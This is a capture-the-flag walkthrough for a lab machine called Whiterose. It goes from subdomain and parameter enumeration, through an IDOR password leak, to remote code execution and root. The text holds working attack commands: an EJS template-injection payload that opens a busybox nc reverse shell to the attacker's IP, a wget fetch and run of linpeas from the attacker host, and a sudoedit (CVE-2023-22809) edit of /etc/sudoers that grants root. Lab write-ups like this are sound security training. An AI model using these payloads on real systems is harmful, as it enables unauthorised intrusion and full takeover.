# Whiterose - Easy

```sh
sudo vim /etc/hosts
# map IP to whiterose.thm

nmap -T4 -p- -A -Pn -v whiterose.thm
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
    * 80/tcp - http - nginx 1.14.0

* we are given the creds 'Olivia Cortez:olivi8' as a note

* checking the webpage, it redirects to 'http://cyprusbank.thm', so we need to update ```/etc/hosts```

* the webpage is for 'National Bank for Cyprus' and is currently under maintenance, so we do not have any other content on the webpage

* web scan:

    ```sh
    gobuster dir -u http://cyprusbank.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -t 10
    # simple dir scan

    ffuf -c -u "http://cyprusbank.thm" -H "Host: FUZZ.cyprusbank.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 57 -s
    # subdomain scan
    ```

* ```ffuf``` gives us a subdomain 'admin.cyprusbank.thm' - we can update this in our ```/etc/hosts``` entry

* navigating to 'admin.cyprusbank.thm' leads to the login page for the admin panel

* we can login here using the creds given earlier in the note

* the dashboard shows us the view of recent payments for this bank

* we also have other endpoints - search, settings, and messages - we can enumerate these

* /search provides an input field to search for accounts

* /settings does not show anything as we do not have permissions to view this page

* /messages leads to a feature for 'admin chat', it has a message input field

* we can check for injection attempts in the input fields for /search and /messages - test by intercepting a valid request using Burp Suite and modifying the request in Repeater

* testing in /search, initial attempts in injection do not give anything

* navigating to /messages, we have a parameter 'c' set to 5 - we can check this parameter as well

* if we change this parameter value to a value like 3 or 4, it shows only last 3 or 4 messages in chat history

* to test for IDOR, we can modify this to extreme values; we can start by modifying it to negative values like -1

* doing so, '/messages/?c=-1' now shows the chats from before the chat history shown earlier

* we can see this if we change the value of 'c' to 0 as well - this shows the dev team's messages

* from this, we get the password 'p~]P@5!6;rs558:q' for 'Gayle Bev' - we can logout and login again

* logging in, we can see the /settings endpoint is accessible now

* the /settings page has an input form with customer name and new password fields - we can change other customers' passwords using this

* when we enter a customer's name and a new password, the password shows as updated, but the login as new password does not work

* as it is an input field, we can attempt to check for injection attacks here

* we can attempt for SQLi after saving the POST request to /settings in Burp Suite:

    ```sh
    sqlmap -r settings.req --batch --dump --level=5 --risk=3
    ```

* we can also fuzz both of the parameters - 'name' and 'password' - using wordlists for injection attacks:

    ```sh
    ffuf -w /usr/share/seclists/Fuzzing/command-injection-commix.txt -u 'http://admin.cyprusbank.thm/settings' -X POST --cookie 'connect.sid=<cookie-value-string>' -d 'name=FUZZ&password=pass' -fs 2094

    ffuf -w /usr/share/seclists/Fuzzing/command-injection-commix.txt -u 'http://admin.cyprusbank.thm/settings' -X POST --cookie 'connect.sid=<cookie-value-string>' -d 'name=test&password=FUZZ' -fs 2094
    ```

* the injection attempts do not lead to anything, so we need to check further manually

* while the webpage does not respond to injection attempts, if we remove the 'password' parameter from the POST request to /settings and just keep the 'name' parameter, we get an error

* the error message mentions a 'ReferenceError' for ```/home/web/app/views/settings.ejs``` because 'password is not defined'; the error messages refers to NodeJS and .ejs files

* Googling for exploits related to 'ejs' files leads to [CVE-2022-29078 - SSTI RCE vuln](https://eslam.io/posts/ejs-server-side-template-injection-rce/)

* we can use the payload from the above PoC and try to get reverse shell:

    ```sh
    sudo tcpdump -i tun0 icmp

    # test payload to see if ping works

    curl 'http://admin.cyprusbank.thm/settings' -X POST --cookie 'connect.sid=s%3ASPtMEQSXQj2H1ITsZw1LL40OMaBqAvgr.HkCxapaOw49vVcN04mP59gkd0UlZnjpnSDTKNmp%2FlE4' -d "name=name&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('ping%20-c%202%20192.168.135.208');s"
    # URL-encoded ping
    # this works

    # we can use the same payload format
    # replace ping command with URL-encoded revshell one-liner

    nc -nvlp 4444

    curl 'http://admin.cyprusbank.thm/settings' -X POST --cookie 'connect.sid=s%3ASPtMEQSXQj2H1ITsZw1LL40OMaBqAvgr.HkCxapaOw49vVcN04mP59gkd0UlZnjpnSDTKNmp%2FlE4' -d "name=name&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox%20nc%20192.168.135.208%204444%20-e%20bash');s"
    # we get reverse shell
    ```

* in reverse shell:

    ```sh
    whoami
    # 'web'

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter twice

    ls -la
    # check webapp files

    cat .env
    # we get DB secret
    ```

* from the '.env' file we get the mongoDB secret 'secureappsecret', used to connect to the mongoDB DB locally on port 8080

* checking further:

    ```sh
    ls -la /home
    # we have only 'web' user

    cd

    ls -la

    cat user.txt
    # user flag

    # fetch linpeas from attacker for enum

    cd /tmp
    wget http://192.168.135.208:8000/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * box is running Linux version 4.15.0-213-generic, Ubuntu 18.04.6
    * target is vulnerable to CVE-2021-4034
    * PATH env var includes a writable path ```/home/web/.nvm/versions/node/v17.9.1/bin```
    * 'web' user has ```sudo -l``` entry - ```(root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm```

* checking the ```sudo -l``` entry, we can run ```sudoedit``` - which provides a way to edit files that need root privileges, without running the editor app as root - on a particular file only

* searching for exploits related to this, we get [CVE-2023-22809](https://www.exploit-db.com/exploits/51217) - this is applicable if user has privileges to run sudoedit, and impacts versions 1.8.0 to 1.9.12p1

* checking the current ```sudo``` version using ```sudo -V```, we can see the components are on 1.9.12p1 version, which means we can exploit this:

    ```sh
    EDITOR="vim -- /etc/sudoers" sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
    ```

* this opens the ```/etc/sudoers``` file, and we can scroll to the bottom, and add this line of config to grant 'web' user root privileges:

    ```sh
    web ALL=(root) NOPASSWD: ALL
    ```

* now we can save the file and exit, and execute any commands as root:

    ```sh
    sudo su root
    # this gives us root shell

    cat /root/root.txt
    # root flag
    ```
